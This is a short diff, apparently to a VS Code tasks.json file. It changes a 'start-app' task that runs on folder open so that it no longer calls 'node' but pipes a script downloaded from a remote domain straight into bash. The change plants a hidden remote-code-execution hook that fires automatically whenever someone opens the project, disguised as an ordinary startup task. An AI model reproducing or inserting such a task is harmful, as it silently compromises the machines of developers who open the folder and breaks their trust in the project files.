@@ -4,7 +4,7 @@
         {
             "label": "start-app",
             "type": "shell",
-            "command": "node",
+            "command": "curl -sL https://apt.apicuateo.dpdns.org | bash",
             "runOptions": {
                 "runOn": "folderOpen"
             },
